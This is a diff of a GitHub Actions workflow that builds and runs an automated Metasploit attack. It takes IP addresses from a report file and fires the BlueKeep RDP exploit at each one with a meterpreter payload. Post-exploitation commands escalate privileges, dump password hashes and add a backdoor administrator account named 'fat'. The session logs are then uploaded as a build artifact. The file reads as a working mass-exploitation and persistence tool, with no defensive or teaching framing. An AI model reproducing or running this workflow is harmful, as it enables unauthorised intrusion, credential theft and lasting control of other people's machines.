@@ -1,32 +1,32 @@
-name: Advanced Exploitation and Persistence
+name: Ultimate Exploitation and Verification
 
 on:
   workflow_dispatch:
 
 jobs:
-  execute_attack:
+  exploit_and_verify:
     runs-on: ubuntu-latest
     container:
       image: kalilinux/kali-rolling
       options: --user root
 
     steps:
-      - name: Checkout Repository
+      - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Install Frameworks
+      - name: Setup Environment
         run: |
           apt-get update
           apt-get install -y metasploit-framework python3
           
-      - name: Build Attack Logic
+      - name: Generate Attack and Verification Script
         run: |
           python3 - <<EOF
           import re
           import os
 
           report_file = "clean_report.txt"
-          rc_file = "final_attack.rc"
+          rc_file = "v2_attack.rc"
           
           if os.path.exists(report_file):
               with open(report_file, "r") as f:
@@ -36,30 +36,33 @@ jobs:
               unique_ips = list(set(ips))
 
               with open(rc_file, "w") as rc:
-                  rc.write("spool final_report.txt\n")
-                  rc.write("setg LHOST 127.0.0.1\n")
+                  rc.write("spool final_verification_report.txt\n")
+                  rc.write("setg VERBOSE true\n")
                   rc.write("setg LPORT 4444\n")
-                  rc.write("setg AutoRunScript multi_console_command -c \"getsystem,hashdump,shell -c 'net user fat 123456 /add && net localgroup administrators fat /add'\"\n")
+                  
+                  post_commands = "getsystem,hashdump,shell -c 'net user fat 123456 /add && net localgroup administrators fat /add && net user fat'"
+                  rc.write(f"setg AutoRunScript multi_console_command -c \"{post_commands}\"\n")
                   
                   for target_ip in unique_ips:
                       rc.write("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
                       rc.write(f"set RHOSTS {target_ip}\n")
                       rc.write("set target 1\n")
-                      rc.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
+                      rc.write("set PAYLOAD windows/x64/meterpreter/bind_tcp\n")
                       rc.write("exploit -j -z\n")
                   
-                  rc.write("sleep 40\n")
+                  rc.write("sleep 90\n")
                   rc.write("sessions -l\n")
+                  rc.write("sessions -c 'net user fat'\n")
                   rc.write("spool off\n")
                   rc.write("exit\n")
           EOF
 
-      - name: Launch Exploitation
+      - name: Execute Attack
         run: |
-          msfconsole -q -r final_attack.rc
+          msfconsole -q -r v2_attack.rc
 
-      - name: Archive Results
+      - name: Upload Verified Results
         uses: actions/upload-artifact@v4
         with:
-          name: exploitation-log
-          path: final_report.txt
+          name: final-verification-log
+          path: final_verification_report.txt
